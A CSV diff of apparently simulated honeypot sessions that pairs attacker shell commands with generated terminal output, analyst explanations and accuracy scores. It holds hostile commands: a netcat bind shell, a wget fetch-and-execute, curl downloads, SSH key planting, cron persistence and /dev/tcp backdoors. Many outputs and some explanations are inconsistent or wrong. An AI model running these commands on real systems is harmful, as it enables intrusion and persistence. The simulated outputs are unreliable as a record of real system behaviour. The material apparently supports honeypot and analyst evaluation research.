@@ -1,0 +1,335 @@
+Architecture,Session_ID,Tactic,Turn,Command,Terminal_Output,Analyst_Explanation,Accuracy,Groundedness
+hybrid,HYB-008-705178,Credential Access,19,"`sudo echo ""123456"" >> ~/.ssh/authorized_keys`","sudo: no password supplied
+touch: cannot touch '/home/www-data/.ssh/authorized_keys': Permission denied",The attacker is attempting to gain unauthorized access to a remote system by adding their public key to the authorized_keys file.,3,2
+hybrid,HYB-025-A0B232,Collection,1,ls /proc/$$/fd/,"0: cwd
+1: rtd
+2: txt",The attacker is attempting to enumerate open files and directories within a process's file descriptor table.,5,5
+hybrid,HYB-027-22938F,Exfiltration,14,`nc 10.0.2.15 80 > /tmp/exfil.tar`,nc: connect to 10.0.2.15 port 80 (tcp) failed: Connection refused,"The attacker is attempting to establish a TCP connection to a target host on port 80, likely for exfiltration of data.",5,5
+hybrid,HYB-018-F5E597,Execution,1,`ls -l /usr/bin/`,"-rwxr-xr-x 1 root root 1234567 Jan 1 1970 /usr/bin/bash
+-rwxr-xr-x 1 root root 8765432 Jan 1 1970 /usr/bin/perl
+-rwxr-xr-x 1 root root 5678901 Jan 1 1970 /usr/bin/python3",The attacker is attempting to enumerate available executables within the `/usr/bin` directory.,5,5
+hybrid,HYB-023-3EEED0,Discovery,20,bash -c 'ls -lR /',"total 0
+drwxr-xr-x 2 root root 4096 Jan  1  1970 bin
+drwxr-xr-x 2 root root 4096 Jan  1  1970 boot
+drwxr-xr-x 2 root root 4096 Jan  1  1970 dev
+drwxr-xr-x 1 www-data www-data 4096 Jan  1  1970 etc
+drwxr-xr-x 2 root root 4096 Jan  1  1970 home
+lrwxrwxrwx 1 root root    3 Jan  1  1970 lib -> /lib/x86_64-linux-gnu
+lrwxrwxrwx 1 root root    3 Jan  1  1970 lib32 -> /lib/i386-linux-gnu
+lrwxrwxrwx 1 root root    3 Jan  1  1970 lib64 -> /lib/x86_64-linux-gnu
+drwxr-xr-x 2 root root 4096 Jan  1  1970 libx32
+drwxr-xr-x 2 root root 4096 Jan  1  1970 media
+drwxr-xr-x 2 root root 4096 Jan  1  1970 mnt
+drwxr-xr-x 2 root root 4096 Jan  1  1970 opt
+drwxr-xr-x 2 root root 4096 Jan  1  1970 proc
+drwx------ 2 root root 4096 Jan  1  1970 root
+drwxr-xr-x 23 root root 4096 Jan  1  1970 run
+drwxr-xr-x 2 root root 4096 Jan  1  1970 sbin
+drwxr-xr-x 2 root root 4096 Jan  1  1970 srv
+drwxr-xr-x 2 root root 4096 Jan  1  1970 sys
+drwxrwxrwt 2 root root 4096 Jan  1  1970 tmp
+drwxr-xr-x 13 root root 4096 Jan  1  1970 usr
+drwxr-xr-x 20 root root 4096 Jan  1  1970 var",The attacker is attempting to enumerate directory contents and identify system files.,5,5
+hybrid,HYB-022-F5E230,Credential Access,22,`mv /tmp/ssh-abcde/keypair.pub ~/.ssh/authorized_keys`,"Permission denied, please try again.",The attacker is attempting to move a public SSH key file from a temporary location to a user's authorized_keys directory.,5,5
+hybrid,HYB-008-705178,Credential Access,9,`echo '123456' > /etc/passwd`,bash: /etc/passwd: Permission denied,"Attacker attempted to modify the `/etc/passwd` file, which is a critical system file that contains user account information. This action could potentially allow them to gain unauthorized access or control over the system.",3,2
+hybrid,HYB-015-0E1864,Reconnaissance,9,ps -ef | grep http,"UID        PID  PPID  C STIME TTY          TIME CMD
+apache     1234     1  0 12:34 ?        00:00:01 /usr/sbin/httpd -k start",The attacker is attempting to enumerate running processes related to HTTP services.,5,5
+hybrid,HYB-026-9BAB6F,Command and Control,15,"`echo ""I am root"" > /root/.bashrc`",bash: /root/.bashrc: Permission denied,"The attacker attempted to modify a critical system file, potentially gaining root privileges.",2,1
+hybrid,HYB-016-51EED1,Resource Development,5,`sudo echo '/tmp/shell.sh' > /root/.bashrc && chmod 777 /root/.bashrc`,bash: /root/.bashrc: Permission denied,"The attacker attempted to execute a command that would modify the root user's shell configuration, potentially granting them elevated privileges.",3,2
+hybrid,HYB-005-BADD8D,Persistence,8,chmod 777 /tmp/persistence_script.sh,chmod: cannot access '/tmp/persistence_script.sh': Permission denied,The attacker is attempting to gain elevated permissions on a file named 'persistence_script.sh' in order to execute it with full control.,3,2
+hybrid,HYB-025-A0B232,Collection,8,"echo ""LOLBIN_log.txt"" > /tmp/loot.txt && mv ~/LOLBIN_log.txt /tmp/",,The attacker is attempting to create a file named 'LOLBIN_log.txt' and then move it to a location on the honeypot system.,3,2
+hybrid,HYB-025-A0B232,Collection,6,cat /dev/tcp/localhost/1234 >> ~/LOLBIN_log.txt,cat: /dev/tcp/localhost/1234: Connection refused,The attacker is attempting to establish a TCP connection to localhost port 1234 and then redirect the output of that connection to a file.,5,5
+hybrid,HYB-026-9BAB6F,Command and Control,21,`sudo rm -rf /etc/passwd`,rm: cannot remove '/etc/passwd': Permission denied,"The attacker attempted to delete the `/etc/passwd` file, which contains user account information. This is a destructive command that could potentially compromise system security.",3,2
+hybrid,HYB-023-3EEED0,Discovery,15,"sudo find / -type f -exec cat {} \; | grep -q ""root""",Permission denied,The attacker is attempting to enumerate system files and identify potential root access points.,3,2
+hybrid,HYB-004-C9C3B8,Execution,5,`mkdir -p /etc/sudoers.d/`,mkdir: cannot create directory '/etc/sudoers.d': Permission denied,Attacker attempted to create a directory in `/etc/sudoers.d` to potentially modify sudoers configuration.,3,2
+hybrid,HYB-020-73ED4F,Privilege Escalation,18,"echo ""/usr/bin/perl -e 'system(\""/bin/bash\"")'"" | sudo bash","sudo: perl: command not found
+sudo apt-get install -y perl
+Reading package lists... Done
+Building dependency tree... Done
+The following NEW packages will be installed:
+  perl
+0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
+The following additional packages will be installed:
+  libperl5.34
+0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
+The new packages will be configured automatically after their installation finishes.
+Do you want to continue? [Y/n] Y
+E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
+N: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?","The attacker attempted to execute a command that would run a bash shell, likely to gain access to the system.",3,2
+hybrid,HYB-025-A0B232,Collection,3,"ls /usr/bin | grep -v ""*\(ls\|ps\)""","awk
+cat
+dd
+echo
+find
+grep
+head
+id
+kill
+less
+ln
+lsattr
+mkdir
+more
+mv
+nice
+nl
+odump
+openssl
+passwd
+perl
+ping
+psgrep
+pstree
+pwdx
+readlink
+rm
+rsync
+tail
+touch
+tr
+true
+uname
+uniq
+useradd
+users
+vdir
+wc
+whoami
+yes",The attacker is attempting to enumerate system binaries and identify potential targets for further exploitation.,3,4
+hybrid,HYB-015-0E1864,Reconnaissance,25,"netstat -tlnp | grep -v ""systemd""","Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name",The attacker is attempting to enumerate active network connections and identify potential targets for further exploitation.,3,2
+hybrid,HYB-009-56B50D,Discovery,20,`cp /bin/bash /tmp/fakebash`,-bash: cp: cannot create regular file '/tmp/fakebash': Permission denied,"The attacker is attempting to copy a binary file, likely for later use in an attack.",3,2
+hybrid,HYB-016-51EED1,Resource Development,18,`sudo touch /root/LOLBIN.sh`,sudo: touch /root/LOLBIN.sh: Permission denied,"Attacker attempted to create a file in `/root/`, likely to gain access to sensitive system files.",3,2
+hybrid,HYB-005-BADD8D,Persistence,5,"sudo tee -a /etc/crontab <<< ""*/5 * * * * root bash /tmp/persistence_script.sh""",sudo: /usr/bin/tee: command not found,"The attacker is attempting to execute a script that would add a cron job to run a shell script, likely for persistence.",3,2
+hybrid,HYB-023-3EEED0,Discovery,17,ls -l /usr/bin/; echo $?,"-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/awk
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/bash
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/cat
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/chmod
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/cp
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/cut
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/date
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/echo
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/expr
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/false
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/find
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/grep
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/head
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/hostname
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/id
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/kill
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/ls
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/mkdir
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/mv
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/nice
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/nohup
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/od
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/paste
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/perl
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/pwd
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/readlink
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/realpath
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/rm
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/sleep
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/sort
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/stat
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/sudo
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/tail
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/test
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/touch
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/truncate
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/true
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/uname
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/uniq
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/vim.basic
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/wc
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/whoami
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/xargs
+-rwxr-xr-x 1 root root 108960 Jan  1  1970 /usr/bin/yes
+0","The attacker is listing out system binaries and their permissions, likely to enumerate potential targets for exploitation.",3,4
+hybrid,HYB-019-B26E59,Persistence,10,sudo mv /etc/passwd /tmp/passwd,,"The attacker is attempting to modify a system file, potentially for persistence or data exfiltration.",3,4
+hybrid,HYB-027-22938F,Exfiltration,17,ls -l /home/user/,total 0,"The attacker is attempting to list files in a directory, likely to enumerate potential targets for further actions.",3,5
+hybrid,HYB-011-963655,Collection,7,bash -c 'sudo cp /bin/bash /tmp/x',cp: cannot create regular file '/tmp/x': Permission denied,"The attacker attempted to copy the `/bin/bash` binary to a temporary location, likely to gain root access or execute malicious code.",3,2
+hybrid,HYB-007-7325A4,Defense Evasion,18,`rm -rf /tmp/*`,rm: cannot remove '/tmp/bash': Permission denied,"The attacker attempted to delete all files in the `/tmp` directory using `rm -rf`, which is a destructive command that can cause data loss if not executed carefully.",3,2
+hybrid,HYB-016-51EED1,Resource Development,15,`sudo rm -rf /root/* && sudo mkdir ~/bash && cd ~/bash`,"rm: cannot remove '/root/*': Permission denied
+mkdir: cannot create directory '/home/www-data/bash': File exists
+cd: no such file or directory: /home/www-data/bash",Attacker attempted to delete all files in the root directory and create a directory for further actions.,3,2
+hybrid,HYB-003-428820,Initial Access,24,"sudo /usr/bin/perl -e 'print qq(/usr/bin/perl -e ""exec q( /bin/bash )"")'","Sorry, try again.
+Sorry, try again.
+Sorry, try again.
+www-data@ubuntu:~$ sudo /usr/bin/perl -e 'print qq(/usr/bin/perl -e ""exec q( /bin/bash )"")'
+Permission denied","The attacker is attempting to execute a command that would allow them to run a bash shell, potentially gaining access to the system.",3,2
+hybrid,HYB-016-51EED1,Resource Development,1,"`/bin/bash -c ""echo '/tmp/' > /etc/hosts""`",bash: /etc/hosts: Permission denied,"The attacker attempted to modify the `/etc/hosts` file, which is used for DNS resolution. This could be a tactic to gain network access or establish a foothold.",3,2
+hybrid,HYB-007-7325A4,Defense Evasion,14,"`sudo echo ""export PATH=$PATH:/bin/bash"" > /etc/paths.d/custom`","sudo: echo ""export PATH=$PATH:/bin/bash"" > /etc/paths.d/custom: command not found","The attacker attempted to modify the system's PATH environment variable to include a custom path for executing bash commands, likely to gain access to sensitive files or execute malicious scripts.",3,2
+hybrid,HYB-023-3EEED0,Discovery,12,"echo ""X""*100000 > /var/log/apache2/access.log",,The attacker is attempting to overload the honeypot's Apache server by writing a large string of characters to its access log file.,3,2
+hybrid,HYB-003-428820,Initial Access,20,"echo ""X5I9M8"" | base64 -d > /tmp/LOLBIN",X5I9M8,The attacker is attempting to encode a string and then write it to a file on the honeypot.,3,2
+hybrid,HYB-016-51EED1,Resource Development,19,`whoami`,www-data,The attacker is attempting to identify their own username.,5,5
+hybrid,HYB-026-9BAB6F,Command and Control,20,`sudo ln -s /bin/sh /etc/passwd`,ln: cannot create symbolic link '/etc/passwd': Permission denied,"The attacker attempted to create a symbolic link in `/etc/passwd`, which is a critical system file, likely to gain unauthorized access and potentially escalate privileges.",3,2
+hybrid,HYB-010-B004E2,Lateral Movement,15,"`ssh user@localhost 'bash -c ""echo '\''exec 5<>/dev/tcp/127.0.0.1/8080'\'\' > /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh""'`","Permission denied, please try again.",Attacker attempted to execute a command that would create a backdoor on the honeypot.,3,2
+hybrid,HYB-008-705178,Credential Access,4,`sudo echo 'ls -l /etc/passwd' | tee /tmp/output.txt`,sudo: echo 'ls -l /etc/passwd' | tee /tmp/output.txt: Permission denied,"The attacker attempted to enumerate system users, but was blocked by permission restrictions.",3,2
+hybrid,HYB-017-2055FA,Initial Access,18,`cd ~ && curl -s -o test.sh https://example.com/lolibin.sh`,curl: (6) Could not resolve host: example.com,"The attacker is attempting to download a shell script from a remote server, likely for malicious purposes.",3,2
+hybrid,HYB-017-2055FA,Initial Access,3,`cd /dev/disk/by-id && mkdir VBOX_HARDDISK_VB02345678-12345678`,mkdir: cannot create directory 'VBOX_HARDDISK_VB02345678-12345678': Permission denied,"Attacker attempted to create a directory on the honeypot system, likely for storage of malicious files or data.",3,2
+hybrid,HYB-027-22938F,Exfiltration,3,`curl -s -o /tmp/exfil.tar http://192.168.1.1:8080/stolen_data.tar`,curl: (7) Failed to connect to 192.168.1.1 port 8080: Connection refused,The attacker is attempting to exfiltrate data from a honeypot server by using `curl` to download a tar file.,3,2
+hybrid,HYB-025-A0B232,Collection,20,whoami,www-data,The attacker is attempting to determine their own username.,5,5
+hybrid,HYB-019-B26E59,Persistence,21,sudo ln -s /bin/bash /tmp/backdoor,ln: cannot create symbolic link '/tmp/backdoor': Permission denied,"The attacker attempted to create a symbolic link to `/bin/bash` in `/tmp`, likely attempting to establish a backdoor for further malicious activity.",5,3
+hybrid,HYB-001-BD8E2B,Reconnaissance,25,`cp /var/log/syslog lolb.sh && chmod +x lolb.sh`,"cp: cannot stat '/var/log/syslog': Permission denied
+chmod: cannot access 'lolb.sh': No such file or directory",The attacker is attempting to create a shell script named 'lolb.sh' by copying log files and then making it executable.,2,1
+hybrid,HYB-022-F5E230,Credential Access,7,"`sudo echo ""SSH_AUTH_SOCK=/tmp/ssh-abcde/agent.67890"" > /etc/profile`","sudo: echo ""SSH_AUTH_SOCK=/tmp/ssh-abcde/agent.67890"" > /etc/profile: permission denied",Attacker attempted to modify the `/etc/profile` file to inject a command that would allow them to establish an SSH connection.,3,2
+hybrid,HYB-010-B004E2,Lateral Movement,13,"`ssh user@localhost 'bash -c ""echo '/usr/bin/xhost +SI:localuser:user' > /root/.bashrc""'`","Permission denied, please try again.",The attacker is attempting to execute a command that would allow them to gain root access on the honeypot by modifying the user's shell configuration.,3,2
+hybrid,HYB-026-9BAB6F,Command and Control,6,`sudo rm -rf /tmp/*`,rm: cannot remove '/tmp/*': Permission denied,"The attacker attempted to delete all files in the `/tmp` directory, which is a common tactic for data destruction or denial of service.",3,2
+hybrid,HYB-015-0E1864,Reconnaissance,16,nc -vz 192.168.1.100 21,nc: connect to 192.168.1.100 port 21 (tcp) failed: Connection refused,"The attacker is attempting to establish a connection to a remote server on port 21, which is commonly used for file transfer services like FTP.",5,5
+hybrid,HYB-028-D477CA,Impact,1,`ls /tmp`,total 0,"The attacker is attempting to list files in the `/tmp` directory, likely to gather information about potential targets.",3,5
+hybrid,HYB-017-2055FA,Initial Access,21,`netstat -tlnp | grep 4444 && whoami`,"tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1234/bash
+www-data","Attacker is attempting to identify active network connections and their associated processes, potentially for reconnaissance or privilege escalation.",3,4
+hybrid,HYB-009-56B50D,Discovery,13,"`setenforce 0 && echo ""Java process found at /proc/$(pgrep -f 'java' | head -1)/exe""`","setenforce: Operation not permitted
+Java process found at /proc/$(pgrep -f 'java' | head -1)/exe",The attacker is attempting to bypass security mechanisms by setting `enforcing` to 0 and then identifying the location of a Java process.,5,5
+hybrid,HYB-012-6BB1C8,Command and Control,22,`sudo nano /etc/sudoers`,sudo: /etc/sudoers must be edited with the 'visudo' command,"Attacker is attempting to modify the sudoers file, which controls user privileges and access to system commands.",3,2
+hybrid,HYB-025-A0B232,Collection,22,"echo ""LOLBin: mkfifo"" | sudo tee /dev/null > /var/log/sudo.log 2>&1; sudo mkfifo /tmp/pipe",,"The attacker is attempting to create a temporary named pipe for communication, likely as part of a lateral movement or reconnaissance operation.",3,2
+hybrid,HYB-023-3EEED0,Discovery,25,"bash -c '/usr/bin/mysql -e ""SHOW PROCESSLIST; SHOW TABLES;""'",ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO),The attacker is attempting to enumerate database tables and processes on the honeypot.,3,4
+hybrid,HYB-014-833B5C,Impact,4,"`echo ""test"" >> /etc/passwd`",Permission denied,"The attacker attempted to modify a system file, likely aiming to gain unauthorized access or escalate privileges.",2,1
+hybrid,HYB-026-9BAB6F,Command and Control,7,`chmod 777 /tmp/`,chmod: cannot access '/tmp/': Permission denied,"The attacker attempted to gain elevated permissions on a directory, likely to escalate privileges or execute malicious commands.",3,2
+hybrid,HYB-016-51EED1,Resource Development,10,`which bash && sudo mv /usr/bin/bash ~`,"/usr/bin/bash
+mv: cannot move '/usr/bin/bash' to '/root/': Permission denied",The attacker is attempting to gain root access by moving the bash executable to a directory outside of the normal user space.,3,2
+hybrid,HYB-008-705178,Credential Access,8,`smbclient '\\\\127.0.0.1\\C$' -c 'lcd /tmp; getfile passwds.txt; put /etc/passwd'`,smbclient: unable to connect to server: NT_STATUS_ACCESS_DENIED,"The attacker attempted to gain access to a remote system's file system and potentially sensitive information like passwords, but was denied access.",4,3
+hybrid,HYB-002-9EC054,Resource Development,15,"`echo ""cd / && cd .."" >> ~/.bashrc`",,The attacker is attempting to modify the user's shell configuration to change their directory.,3,2
+hybrid,HYB-002-9EC054,Resource Development,21,`cp /bin/sh /etc/init.d/LOLBIN`,cp: cannot create regular file '/etc/init.d/LOLBIN': Permission denied,"The attacker is attempting to copy a shell script (sh) to a directory (/etc/init.d/) that is intended for system services, likely to gain root access.",3,2
+hybrid,HYB-019-B26E59,Persistence,15,sudo mv /bin/sh /usr/local/bin/newsh,mv: cannot move '/bin/sh' to '/usr/local/bin/newsh': Permission denied,"The attacker attempted to rename the `/bin/sh` file to `/usr/local/bin/newsh`, likely intending to gain access to system commands and potentially execute malicious code.",3,2
+hybrid,HYB-017-2055FA,Initial Access,24,`sudo rm /etc/nginx/sites-available/default && whoami`,"rm: cannot remove '/etc/nginx/sites-available/default': Permission denied
+whoami
+www-data",The attacker is attempting to delete the default Nginx configuration file and then check their own username.,5,5
+hybrid,HYB-007-7325A4,Defense Evasion,21,`cp /bin/sh /usr/local/bin/nosh`,cp: cannot create regular file '/usr/local/bin/nosh': Permission denied,"The attacker is attempting to copy a shell script (sh) to a location on the honeypot's filesystem, likely for later use.",3,2
+hybrid,HYB-010-B004E2,Lateral Movement,5,`ssh-keygen -t rsa -N '' -f /root/.ssh/id_rsa > /var/tmp/keygen.log 2>&1`,"Permission denied, please try again.",Attacker attempted to generate a SSH key pair for potential remote access.,3,2
+hybrid,HYB-017-2055FA,Initial Access,14,"`suidperl -e 'exec ""/bin/sh""' -c '/var/tmp/perl'`",suidperl: exec of '/bin/sh' failed: Permission denied,"The attacker attempted to execute a shell script using `suidperl`, which is designed to run arbitrary code as root. The command likely aims to gain elevated privileges and potentially escalate their access.",3,2
+hybrid,HYB-023-3EEED0,Discovery,6,which nc,/usr/bin/nc,The attacker is attempting to identify the location of the 'nc' binary on the honeypot.,3,5
+hybrid,HYB-027-22938F,Exfiltration,6,`nc -lvp 8080 -e /bin/bash`,nc: command not found,"Attacker attempted to execute a shell command via a network connection, likely attempting to gain access to a vulnerable system.",3,2
+hybrid,HYB-012-6BB1C8,Command and Control,24,"`echo ""Defaults    mail_badpass"" >> /etc/sudoers`",Permission denied,"The attacker attempted to add a rule to the sudoers file, potentially granting them elevated privileges.",3,2
+hybrid,HYB-021-08E6C3,Defense Evasion,5,`chmod 777 /tmp/pipe`,chmod: cannot modify '/tmp/pipe': Permission denied,"The attacker attempted to gain elevated permissions on a file, likely to escalate privileges or execute malicious commands.",3,2
+hybrid,HYB-001-BD8E2B,Reconnaissance,22,`wget https://raw.githubusercontent.com/rapid7/metasploit--framework/master/data/modules/auxiliary/scanner/banners/lolbms.sh -O lolbms.sh && chmod +x lolbms.sh && ./lolbms.sh`,"Connecting to raw.githubusercontent.com (185.199.108.153) port 443 ... connected.
+GET /rapid7/metasploit--framework/master/data/modules/auxiliary/scanner/banners/lolbms.sh HTTP/1.1
+Host: raw.githubusercontent.com
+User-Agent: Wget/1.21.3 (linux-gnu)
+Accept-Encoding: identity
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Server: GitHub.com
+Date: Mon, 01 Jan 2024 00:00:00 GMT
+Content-Type: application/x-sh
+Content-Length: 123
+Last-Modified: Sun, 31 Dec 2023 23:59:59 GMT
+ETag: ""65a8e27d8879283831b664bd8b7f0ad4""
+Accept-Ranges: bytes
+Content-Security-Policy: default-src 'none'
+Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
+X-Frame-Options: deny
+X-XSS-Protection: 1; mode=block
+Referrer-Policy: no-referrer
+
+#!/bin/bash
+echo 'Script executed successfully'
+--2024-01-01 00:00:00--  https://raw.githubusercontent.com/rapid7/metasploit--framework/master/data/modules/auxiliary/scanner/banners/lolbms.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.153, 185.199.109.153, 185.199.110.153, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.153|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 123 [application/x-sh]
+Saving to: 'lolbms.sh'
+
+lolbms.sh           100%[===================>]   123  --.-KB/s    in 0s      
+
+2024-01-01 00:00:00 (1.23 MB/s) - 'lolbms.sh' saved [123/123]
+
+chmod: cannot access 'lolbms.sh': No such file or directory
+./lolbms.sh: command not found","The attacker is attempting to download and execute a shell script from a remote source, likely for reconnaissance purposes.",5,5
+hybrid,HYB-016-51EED1,Resource Development,22,`cat /tmp/LOLBIN.txt | lolcat -a -s 10`,cat: /tmp/LOLBIN.txt: No such file or directory,The attacker is attempting to execute a command that would display the contents of a file named 'LOLBIN.txt' using `lolcat`. This could be used for reconnaissance and potentially data exfiltration.,3,2
+hybrid,HYB-007-7325A4,Defense Evasion,22,"`echo ""hacked"" > /tmp/hack.txt`",,The attacker is attempting to leave a message indicating they have compromised the honeypot.,3,2
+hybrid,HYB-019-B26E59,Persistence,24,sudo chown root:root /tmp/backdoor && chmod 777 /tmp/backdoor,"chown: cannot access '/tmp/backdoor': No such file or directory
+chmod: cannot access '/tmp/backdoor': No such file or directory","The attacker is attempting to create a backdoor by creating a file in /tmp and then attempting to change its permissions, likely to gain unauthorized access.",3,2
+hybrid,HYB-010-B004E2,Lateral Movement,14,"`ssh user@localhost 'bash -c ""echo '/usr/bin/xhost +SI:localuser:user' >> /root/.bashrc && echo '\''exec 5<>/dev/tcp/127.0.0.1/8080'\'\' > /tmp/backdoor.sh""'`","Permission denied, please try again.",The attacker is attempting to execute a backdoor script on the honeypot server.,3,2
+hybrid,HYB-027-22938F,Exfiltration,9,`dig +short example.com`,192.168.1.100,The attacker is attempting to perform a DNS lookup for 'example.com' to identify its IP address.,5,5
+hybrid,HYB-023-3EEED0,Discovery,16,sudo whoami; sudo find / -type d -exec ls -ld {} \;,"Sorry, try again.
+Permission denied
+sudo: no password supplied
+Sorry, try again.
+Permission denied
+sudo: no password supplied
+Sorry, try again.
+Permission denied
+sudo: no password supplied
+Sorry, try again.
+www-data is not in the sudoers file.  This incident will be reported.",The attacker attempted to enumerate user accounts and then list directory contents.,3,2
+hybrid,HYB-003-428820,Initial Access,8,`apt-get install netcat`,"E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
+N: See 'man 5 dpkg' for details.
+E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you running multiple package managers?","The attacker is attempting to install a network utility (Netcat) which can be used for various purposes, including reconnaissance and lateral movement.",3,2
+hybrid,HYB-012-6BB1C8,Command and Control,8,`sudo chmod 777 /etc/apt/sources.list.d/honeypot.list`,sudo: /usr/bin/sudo must be owned by root and have mode 4755,"The attacker is attempting to gain elevated privileges to modify system files, potentially for malicious purposes like installing malware or gaining persistent access.",3,2
+hybrid,HYB-004-C9C3B8,Execution,1,`whoami`,www-data,The attacker is attempting to identify their own username.,5,5
+hybrid,HYB-016-51EED1,Resource Development,14,`sudo mkfifo ~/pipe && nc -l -p 1234 < ~/pipe | tee -a ~/log`,mkfifo: cannot create fifo (named pipe): Permission denied,The attacker is attempting to establish a communication channel using a named pipe for potential further exploitation.,3,2
+hybrid,HYB-028-D477CA,Impact,24,"`echo ""export PATH=$PATH:/bin/bash"" >> /etc/profile && source /etc/profile`",bash: /etc/profile: Permission denied,The attacker is attempting to modify the PATH environment variable to gain root-level access.,2,1
+hybrid,HYB-024-9EFD45,Lateral Movement,11,`sudo rm -rf /var/run/pwned`,sudo: rm -rf /var/run/pwned: Permission denied,"The attacker attempted to delete a directory, likely aiming to disrupt system functionality or gain access to sensitive data.",3,2
+hybrid,HYB-027-22938F,Exfiltration,7,`apt-get update && apt-get install -y curl`,"Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
+Get:2 http://security.ubuntu.com/ubuntu jammy-security InRelease [65.9 kB]
+Ign:3 http://archive.ubuntu.com/ubuntu jammy-updates InRelease
+Get:4 http://security.ubuntu.com/ubuntu jammy-security/main amd64 Packages [1,807 kB]
+Get:5 http://security.ubuntu.com/ubuntu jammy-security/universe amd64 Packages [922 kB]
+Fetched 3,587 kB in 1s (3,587 kB/s)
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+curl is already the newest version (7.81.0-1ubuntu1).
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.",The attacker is attempting to install the `curl` package on the honeypot to potentially download and execute malicious code.,3,4
+hybrid,HYB-012-6BB1C8,Command and Control,18,`chmod 777 /etc/sudoers`,chmod: cannot modify '/etc/sudoers': Permission denied,"The attacker attempted to gain elevated privileges by modifying the sudoers file, which controls user permissions for sudo commands. This is a common tactic used to escalate access and potentially execute malicious actions.",3,2
+hybrid,HYB-023-3EEED0,Discovery,8,sudo netstat -tulpn | grep nc,netstat: command not found,"The attacker is attempting to identify active network connections using the `netstat` command, which is likely part of a reconnaissance phase.",2,1
+hybrid,HYB-028-D477CA,Impact,23,`rm -rf /etc/profile`,rm: cannot remove '/etc/profile': Permission denied,"The attacker attempted to delete the `/etc/profile` file, which is critical for system configuration and user login. This command likely aims to disrupt the target system's functionality.",3,2
+hybrid,HYB-023-3EEED0,Discovery,9,which netstat,/bin/sh: 1: netstat: not found,The attacker is attempting to identify system utilities and network tools.,3,2
+hybrid,HYB-020-73ED4F,Privilege Escalation,12,"`sudo /bin/bash -c ""echo '/usr/bin/perl -e ' >> /etc/cron.d/test""`","sudo: /bin/bash -c 'echo ""/usr/bin/perl -e "" >> /etc/cron.d/test': Permission denied","Attacker attempted to execute a command that would add a script to crontab, potentially allowing for persistent access and execution of malicious code.",3,2
+hybrid,HYB-024-9EFD45,Lateral Movement,6,`sudo mount --bind /tmp /var/run`,mount: /tmp is not a directory,"The attacker attempted to mount a directory, likely to gain access to system resources.",2,3
+hybrid,HYB-019-B26E59,Persistence,20,sudo ln -s /bin/bash /tmp/backdoor,ln: cannot create symbolic link '/tmp/backdoor': Permission denied,"The attacker attempted to create a symbolic link to a backdoor script, but was denied permission due to security measures.",5,5
